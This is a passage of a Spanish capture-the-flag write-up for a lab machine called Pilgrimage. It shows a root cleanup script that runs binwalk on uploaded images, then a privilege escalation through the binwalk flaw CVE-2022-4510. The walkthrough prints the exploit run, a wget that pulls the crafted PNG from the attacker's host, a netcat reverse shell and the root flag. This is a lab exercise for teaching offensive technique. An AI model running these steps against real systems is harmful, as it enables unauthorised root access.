+root         674  0.0  0.0   5844  1736 tty1     Ss+  06:40   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root         700  0.0  0.1  13352  7632 ?        Ss   06:40   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root        1526  0.0  0.2  14712  8952 ?        Ss   09:33   0:00  \_ sshd: emily [priv]
+root         722  0.0  0.1  99884  5804 ?        Ssl  06:40   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0  
+root         780  0.0  0.0  56376  1624 ?        Ss   06:40   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+root        1643  0.0  0.0   6816  3264 ?        S    09:43   0:00 bash
+root        1646  0.0  0.0   5416   648 ?        S    09:44   0:00  \_ script /dev/null -c bash
+root        1647  0.0  0.0   2480   504 pts/1    Ss   09:44   0:00      \_ sh -c bash
+root        1648  0.0  0.0   7160  3828 pts/1    S+   09:44   0:00          \_ bash
+</code></pre></div><p>Un proceso interesante es <code>/bin/bash /usr/sbin/malwarescan.sh</code>. Leamos este <em>script</em> en Bash:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+
+<span class="mtk1">blacklist</span><span class="mtk5">=</span><span class="mtk1">(</span><span class="mtk4">"Executable script"</span><span class="mtk1"> </span><span class="mtk4">"Microsoft executable"</span><span class="mtk1">)</span>
+
+<span class="mtk8">/usr/bin/inotifywait</span><span class="mtk1"> </span><span class="mtk6">-m</span><span class="mtk1"> </span><span class="mtk6">-e</span><span class="mtk1"> </span><span class="mtk4">create</span><span class="mtk1"> </span><span class="mtk4">/var/www/pilgrimage.htb/shrunk/</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk7">read</span><span class="mtk1"> </span><span class="mtk4">FILE</span><span class="mtk1">; </span><span class="mtk5">do</span>
+<span class="mtk1">        filename</span><span class="mtk5">=</span><span class="mtk4">"/var/www/pilgrimage.htb/shrunk/$(</span><span class="mtk8">/usr/bin/echo</span><span class="mtk4"> "</span><span class="mtk1">$FILE</span><span class="mtk4">" </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">/usr/bin/tail</span><span class="mtk4"> </span><span class="mtk6">-n</span><span class="mtk4"> </span><span class="mtk6">1</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">/usr/bin/sed</span><span class="mtk4"> </span><span class="mtk6">-n</span><span class="mtk4"> </span><span class="mtk6">-e</span><span class="mtk4"> 's/^.*CREATE //p')"</span>  
+<span class="mtk1">        binout</span><span class="mtk5">=</span><span class="mtk4">"$(</span><span class="mtk8">/usr/local/bin/binwalk</span><span class="mtk4"> </span><span class="mtk6">-e</span><span class="mtk4"> "</span><span class="mtk1">$filename</span><span class="mtk4">")"</span>
+<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> banned </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk4">"${</span><span class="mtk1">blacklist</span><span class="mtk4">[@]}"</span><span class="mtk1">; </span><span class="mtk5">do</span>
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk4">"</span><span class="mtk1">$binout</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk4">"</span><span class="mtk1">$banned</span><span class="mtk4">"</span><span class="mtk5">*</span><span class="mtk1"> ]]; </span><span class="mtk5">then</span>
+<span class="mtk1">                        </span><span class="mtk8">/usr/bin/rm</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$filename</span><span class="mtk4">"</span>
+<span class="mtk1">                        </span><span class="mtk5">break</span>
+<span class="mtk1">                </span><span class="mtk5">fi</span>
+<span class="mtk1">        </span><span class="mtk5">done</span>
+<span class="mtk5">done</span>
+</code></pre></div><p>El <em>script</em> analiza la carpeta donde se cargan las imágenes desde el sitio web. Si el archivo de imagen contiene algunas <em>strings</em> sospechosas, el <em>script</em> emplea <code>binwalk</code> para buscar archivos embebidos y extraer su contenido para eliminarlo y evitar que el <em>malware</em> infecte la máquina.</p><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>El <em>script</em> en Bash anterior es corto y parece ser seguro. El comando que parece más sospechoso es <code>binwalk</code>. De hecho, tenemos la versión 2.3.2:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">emily@pilgrimage</span>:<span class="code-blue">/tmp</span>$ binwalk 2&gt;&1 | head
+
+Binwalk v2.3.2
+Craig Heffner, ReFirmLabs
+https://github.com/ReFirmLabs/binwalk
+
+Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
+
+Signature Scan Options:
+    -B, --signature              Scan target file(s) for common file signatures
+    -R, --raw=&lt;str&gt;              Scan target file(s) for the specified sequence of bytes  
+</code></pre></div><p>Hay un <em>exploit</em> para esta versión que deriva en ejecución remota de comandos (más información en <a href="https://portswigger.net/daily-swig/serious-security-hole-plugged-in-infosec-tool-binwalk">portswigger.net</a>). Y también existe un <em>exploit</em> público en <a href="https://www.exploit-db.com/exploits/51249">ExploitDB</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> binwalk
+------------------------------------------------- ------------------------  
+ Exploit Title                                   | Path
+------------------------------------------------- ------------------------
+ <span class="code-red">Binwalk</span> v2.3.2 - Remote Command Execution (RCE) | python/remote/51249.py
+------------------------------------------------- ------------------------
+Shellcodes: No Results
+</code></pre></div><p>El exploit inyecta código de Python para generar un comando de <em>reverse shell</em> que se ejecuta cuando <code>binwalk</code> intenta extraer archivos del archivo de imagen maliciosamente diseñado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">51249.py</span> -h
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+usage: 51249.py [-h] file ip port
+
+positional arguments:
+  file        Path to input .png file
+  ip          Ip to nc listener
+  port        Port to nc listener
+
+options:
+  -h, --help  show this help message and exit
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">51249.py</span> <span class="mtku">exploit.png</span> 10.10.17.44 4444
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.  
+</code></pre></div><p>Ahora transferimos <code>binwalk_exploit.png</code> a la máquina remota y la movemos a <code>/var/www/pilgrimage.htb/shrunk</code> para activar la <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">emily@pilgrimage</span>:<span class="code-blue">~</span>$ cd /tmp
+<span class="code-green">emily@pilgrimage</span>:<span class="code-blue">/tmp</span>$ wget -q 10.10.17.44/binwalk_exploit.png
+<span class="code-green">emily@pilgrimage</span>:<span class="code-blue">/tmp</span>$ mv binwalk_exploit.png /var/www/pilgrimage.htb/shrunk  
+</code></pre></div><p>Y ahí lo tenemos. Somos <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.94 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.219:43596.
+whoami
+root
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+root@pilgrimage:~/quarantine# ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+root@pilgrimage:~/quarantine# export TERM=xterm
+root@pilgrimage:~/quarantine# export SHELL=bash
+root@pilgrimage:~/quarantine# stty rows 50 columns 158  
+root@pilgrimage:~/quarantine# cd
+root@pilgrimage:~# cat root.txt
+123667c25801c81db9a41a7f8612a926
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-de-git">Enumeración de Git</a></li><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
